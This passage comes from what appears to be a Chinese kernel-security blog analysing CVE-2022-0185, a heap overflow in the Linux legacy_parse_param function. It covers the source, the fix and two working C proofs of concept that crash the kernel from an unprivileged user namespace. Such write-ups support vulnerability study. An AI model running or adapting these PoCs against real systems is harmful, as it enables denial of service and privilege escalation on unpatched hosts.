class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体函数表如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们回到上面对于<code>vfs_parse_fs_param</code>的分析，他是调用了ops-&gt;parse_param函数，对应于函数表当中的<code>legacy_parse_param</code>函数，下面我们就来分析一下</p><h3 id="legacy-parse-param"><a href="#legacy-parse-param" class="headerlink" title="legacy_parse_param"></a>legacy_parse_param</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * 向旧配置添加参数。我们建立一个以逗号分隔的选项列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private; <span class="hljs-comment">//初始化时为zalloc分配的一段堆空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">//第一次调用的时候，size应该还是0</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret;<br><br>        ret = vfs_parse_fs_param_source(fc, param);<br>        <span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br>            <span class="hljs-keyword">return</span> ret;<br><br>        <span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br>            <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<br>len = <span class="hljs-number">1</span> + param-&gt;size; <span class="hljs-comment">//len被赋值为1+（_value）的长度</span><br>fallthrough;<br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们接下来分批次查看上述源码</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>首先便是一系列赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private; <span class="hljs-comment">//初始化时为zalloc分配的一段堆空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">//第一次调用的时候，size应该还是0</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret;<br></code></pre></td></tr></table></figure><p>在我们一开始分配fscontext的时候，会调用<code>legacy_init_fs_context</code>函数，他会将我们的fc-&gt;fs_private分配一个填充0的堆块，然后该代码就是将其堆块赋值给ctx字段，然后赋值其中的size，注意在我们第一次调用到该函数的时候，其都为0</p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<br>len = <span class="hljs-number">1</span> + param-&gt;size; <span class="hljs-comment">//len被赋值为1+（_value）的长度</span><br>fallthrough;<br><br>...<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里我将多余代码去除，可以看到len被赋值为我们之前传入的_value值的大小+1，然后之后就有一个判断，但是这里的判断是存在漏洞的</p><p>因为len的类型为size_t, size的类型同样也是unsigned int,因此如果说我们的<code>size+2&gt;PAGE_SIZE</code>的话，右边就会出现一个极大的数，然后我们的len长度就可以任意覆盖且绕过判断，具体有啥用处我们之后再详细讲解</p><h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中第一个if判断我们传入的key是否包含<code>,</code>，或value当中是否包含<code>,</code>,然后如果咱们是第一次调用该函数，那么legacy_data应该为0，所以这里会调用我们的kmalloc，并从kmalloc-4k当中取。</p><h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是拷贝我们的ctx之中缓冲区的过程，其中ctx-&gt;legacy_data应该是这种情况</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&#123;,key_0=value_0,key_1=value_1,<span class="hljs-params">...</span><span class="hljs-params">...</span>\<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>修改这个ctx实际上就是修改我们(struct legacy_fs_context)fc-&gt;fs_private的过程</p><p>该bug自从<a href="https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">v5.1_rc1</a>就开始出现，其中的修复也十分简单，仅仅是将其中的减法替换为加法，这样就不会存在溢出的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/fs/fs_context.c b/fs/fs_context.c<br>index de1985eae..a195e516f <span class="hljs-number">100644</span><br>--- a/fs/fs_context.c<br>+++ b/fs/fs_context.c<br>@@ <span class="hljs-number">-548</span>,<span class="hljs-number">7</span> +<span class="hljs-number">548</span>,<span class="hljs-number">7</span> @@ <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>                              param-&gt;key);<br>        &#125;<br><br>-       <span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br>+       <span class="hljs-keyword">if</span> (size + len + <span class="hljs-number">2</span> &gt; PAGE_SIZE)<br>                <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br></code></pre></td></tr></table></figure><h2 id="2-漏洞触发poc编写"><a href="#2-漏洞触发poc编写" class="headerlink" title="2.漏洞触发poc编写"></a>2.漏洞触发poc编写</h2><p>这里先给出洞主的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FSCONFIG_SET_STRING 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-type">char</span>* val = <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>        <span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br>        fd = fsopen(<span class="hljs-string">&quot;9p&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++) &#123;<br>                fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, val, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里最初发现无法触发漏洞，但是willsroot本人所说是“reliably”</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/18d8bc3eb13533fa3488151feed3fd1f41345bc1.jpg"></p><p>经过打印调试:dog:,发现返回值为-1，到源码里面发现是在这一步进行了返回</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d1a20cf431adcbef0c11f837eaaf2edda3cc9fde.jpg"></p><p>而网上搜寻资料得知，ns_capable()负责主体(进程)和客体(资源)的capability进行校验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ns_capable - Determine if the current task has a superior capability in effect</span><br><span class="hljs-comment"> * @ns:  The usernamespace we want the capability in</span><br><span class="hljs-comment"> * @cap: The capability to be tested for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Return true if the current task has the given superior capability currently</span><br><span class="hljs-comment"> * available for use, false if not.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This sets PF_SUPERPRIV on the task if the capability is available on the</span><br><span class="hljs-comment"> * assumption that it&#x27;s about to be used.</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns, <span class="hljs-type">int</span> cap)</span><br>&#123;<br><span class="hljs-keyword">return</span> ns_capable_common(ns, cap, CAP_OPT_NONE);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是在检查我们的用户命名空间的权限,解决方法截选自<a href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#Proof-of-Concept">arttnba3师傅博客</a></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/e850352ac65c10383b6148f3f4119313b07e89e0.jpg"></p><p>除此之外willsroot洞主的博客当中也有说明这一点，但就是不知道为啥在作者第一个poc当中并未体现</p><blockquote><p>This bug popped up since <a href="https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">5.1-rc1</a>. It’s important to note that you need the <code>CAP_SYS_ADMIN</code> capability to trigger it, but the permission only <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L122">needs to be granted in the CURRENT NAMESPACE</a>. Most unprivileged users can just <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> (equivalent of the command <code>unshare -Urm</code>) to enter a namespace with the <code>CAP_SYS_ADMIN</code> permission, and abuse the bug from there; this is what makes this such a dangerous vulnerability.</p></blockquote><p>因此我们可以稍微修改一下willsroot师傅的poc即可成功造成kernel panic</p><p>首先我们知道了漏洞点，其中我们该如何触发呢，那就是使得我们的size，也就是我们已经写入的大小，但是现在有个问题，如果你任意调用fsconfig的话，或者说你调用fsconfig一直调用一天有可能也触发不了kernel panic</p><p>但其实原作者的poc并不是瞎编的，也是通过了一定的计算，我们先来缕一缕</p><p>首先我们每次写入的字节数应该是一个<code>,</code>一个<code>=</code>和我们key、value的长度，所以长度应该是<code>length(key)+length(value)+2</code>,并且我们每次需要通过这个检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br></code></pre></td></tr></table></figure><p>所以我们尽量需要满足size在4095,也就是刚好需要填充满整个申请页面才行，不然如果说在之前填入的时候有空闲，那就不会继续写入，被这个检测拦住，所以我们需要刚好规划到4095这个size，下面就是我按照自行理解所写poc</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>        <span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span>* val = <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>        unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>        fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>                fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br><br>        fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++)&#123;<br>            fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>效果展示</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/ac4bd11373f08202ace0170e0dfbfbedab641b95.jpg"></p><p>经过多次测试，现在的情况算是可以造成内核报错reliably了</p><h1 id="四、消息队列"><a href="#四、消息队列" class="headerlink" title="四、消息队列"></a>四、消息队列</h1><p>消息队列是进程之间通信的一种方法，基于SystemV模型，其功能原理并不是很难</p><p>产生消息并将其写道队列的进程通常被成为发送者，而一个或其他多个进程就被称为接收者，他们均从队列获取信息。每个消息包含消息正文和一个(正)数，该数用来实现在消息队列内实现几种类型的消息。同一编号的消息按照FIFO来处理。此种涉及到的消息队列数据结构在源码中以<code>msg_queue</code>来进行表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* 上一次调用msgsnd发送消息的时间 */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* 上一次调用msgrcv接收消息的时间 */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* 上一次修改的时间 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* 队列上当前字节数 */</span><br><span 